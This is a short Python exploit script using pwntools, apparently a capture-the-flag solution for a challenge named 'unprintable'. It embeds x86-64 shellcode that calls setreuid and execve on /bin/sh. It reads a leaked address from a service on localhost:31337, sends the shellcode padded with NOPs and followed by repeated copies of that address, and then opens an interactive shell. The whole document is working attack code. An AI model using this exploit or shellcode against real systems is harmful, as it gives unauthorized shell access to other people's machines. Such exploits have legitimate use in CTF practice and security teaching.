from pwn import *

# getseteuid execve binsh
shellcode = b'H1\xc0\xb0k\x0f\x05H\x89\xc7H\x89\xc6H1\xc0\xb0q\x0f\x05H1\xd2H1\xf6H\xbf//bin/shVWH\x89\xe7H1\xc0\xb0;\x0f\x05'

# p = process("../unprintable")
p = remote("localhost", "31337")

p.recvline()
p.recvline()
leak = int(p.recvline().split(b": ")[1].decode(), 16)
p.recvline()

payload = b""
payload += shellcode
while len(payload) % 8 != 0:
    payload += b"\x90"

payload += p64(leak)*20

p.sendline(payload)

p.interactive()